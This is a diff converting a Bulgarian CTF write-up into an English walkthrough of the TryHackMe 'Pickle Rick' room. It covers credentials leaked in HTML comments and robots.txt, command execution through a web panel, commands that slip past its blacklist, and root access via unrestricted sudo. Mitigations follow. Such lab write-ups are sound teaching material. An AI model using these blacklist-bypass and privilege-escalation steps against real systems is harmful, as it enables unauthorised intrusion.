@@ -1,39 +1,138 @@
 # Pickle Rick — TryHackMe
 
-Beginner-friendly Rick and Morty themed web machine. Цел: три "Ingredients" файла, скрити зад web enumeration, command injection и privilege escalation.
+Beginner-friendly Rick and Morty themed web machine. Goal: find three "Ingredients" files hidden behind web enumeration, command injection, and privilege escalation.
 
-## Vulnerability
+- Platform: TryHackMe
+- Difficulty: Beginner
+- Category: Web, Linux
 
-- Web сървър с изложени коментари в HTML/robots.txt, водещи до скрити страници и creds.
-- Панел за административни команди, изпълняващ ги без sanitization → OS command injection.
-- SUID бинарник, позволяващ privilege escalation до root.
+## Reconnaissance
 
-## Attack
+### Nmap Scan
 
-1. Enumeration:
-   ```bash
-   nmap -sV -p- <target-ip>
-   curl http://<target-ip>/robots.txt
-   ```
-   `robots.txt` разкрива низ, който служи като username hint; преглед на HTML source на страницата разкрива парола в коментар.
-2. Login в admin панела с намерените credentials → достъп до "Command Panel", изпълняващ shell команди.
-3. Command injection през панела за първоначален shell:
-   ```
-   ls -la; whoami
-   ```
-4. Enumeration за privesc — търсене на SUID бинарници:
-   ```bash
-   find / -perm -4000 2>/dev/null
-   sudo -l
-   ```
-5. Използване на разрешен `sudo`/SUID бинарник за ескалация до root и събиране на трите "Ingredients" файла (flags).
+```bash
+nmap -sV -oN scan.txt <TARGET_IP>
+```
+
+Open ports:
+
+| Port | Service |
+|---|---|
+| 22/tcp | SSH (OpenSSH) |
+| 80/tcp | HTTP (Apache) |
+
+The web server is the main attack surface; SSH requires credentials we don't have yet.
+
+## Web Enumeration
+
+Opening the site shows a page hinting at Burp Suite (an intentional nudge from the room authors).
+
+**View Page Source** (`Ctrl+U`) reveals a hidden HTML comment:
+
+```html
+<!-- Username: R1ckRul3s -->
+```
+
+**robots.txt** is publicly accessible and lists a disallowed path, which turns out to contain the plaintext password:
+
+```bash
+curl http://<TARGET_IP>/robots.txt
+```
+
+```
+Wubbalubbadubdub
+```
+
+Credentials found:
+- Username: `R1ckRul3s`
+- Password: `Wubbalubbadubdub`
+
+## Gaining Access
+
+An SSH attempt with these credentials fails (as expected — they're for the web app, not the OS account):
+
+```bash
+ssh root@<TARGET_IP>
+```
+
+The credentials work on the web login at `portal.php`, which exposes a command panel with direct command execution (RCE).
+
+### Command blacklist
+
+`cat` (and several other common commands) is blocked by the panel:
+
+```php
+$blacklist = array('cat', 'more', 'less', 'head', 'tail', 'nano', 'vim', ...);
+```
+
+Workarounds to read file contents without a blacklisted command:
+
+```bash
+grep . filename
+while read line; do echo $line; done < filename
+strings filename
+tac filename
+```
+
+## Exploitation
+
+List the current directory and read the first ingredient:
+
+```bash
+ls
+grep . Sup3rS3cretPickl3Ingred.txt
+# or
+tac Sup3rS3cretPickl3Ingred.txt
+```
+
+### Privilege Escalation
+
+```bash
+sudo -l
+```
+
+Output shows `(ALL) NOPASSWD: ALL` — a critical misconfiguration granting full control of the system as root without a password.
+
+Locating the remaining ingredients:
+
+```bash
+sudo ls ../../../*
+```
+
+(`../../../` walks up three levels to `/`, then `*` lists everything — revealing the other two ingredient files.)
 
 ## Evidence
 
-*(попълни с реален output от твоята сесия — namите на трите ingredient файла и root shell доказателство)*
+*(fill in with real output from your session — the three ingredient file paths and root shell proof)*
+
+## Attack Narrative
+
+The application leaks sensitive information through a client-side channel that should never carry secrets: an HTML comment holding a username, and a publicly reachable `robots.txt` entry holding a password. Those credentials unlock an admin command panel with direct OS command execution. A blacklist attempts to block dangerous commands but only covers exact command names, so alternative file-reading commands bypass it trivially. Privilege escalation is immediate due to an unrestricted `sudo` configuration (`NOPASSWD: ALL`).
+
+## Lessons Learned
+
+- Always check page source (`Ctrl+U`) and `robots.txt` early in web recon — both are common leak vectors for credentials and hidden paths.
+- Command blacklists based on exact string matching are easy to bypass; validate/sanitize input properly instead.
+- Run `sudo -l` immediately after gaining any shell — it's often the fastest path to privilege escalation.
+- Never leave credentials in HTML comments or publicly reachable files.
+
+## Web Recon Checklist
+
+- [ ] `nmap -sV -sC -oN scan.txt <IP>`
+- [ ] Open `http://<IP>` in a browser
+- [ ] View Page Source (`Ctrl+U`) — comments, paths, credentials
+- [ ] `http://<IP>/robots.txt`
+- [ ] `http://<IP>/sitemap.xml`
+- [ ] Directory bruteforce: `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
+- [ ] Check every discovered path
 
 ## Mitigation
 
-- Никога не оставяй credentials в HTML коментари или публично достъпни файлове.
-- Валидирай и sanitize-вай всякакъв входящ команден низ преди подаване към shell (избягвай директно `os.system`/`exec` с user input).
-- Ограничавай `sudo`/SUID права до строг минимум, необходим за конкретната функция.
+- Never leave credentials in HTML comments or publicly accessible files (`robots.txt`, JS bundles, etc.).
+- Sanitize and validate all user input before passing it to a shell, and use allowlists instead of denylists for command execution features.
+- Restrict `sudo`/SUID permissions to the strict minimum required for the account's function.
+
+## Resources
+
+- [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)
+- [robots.txt explained](https://developers.google.com/search/docs/crawling-indexing/robots/intro)
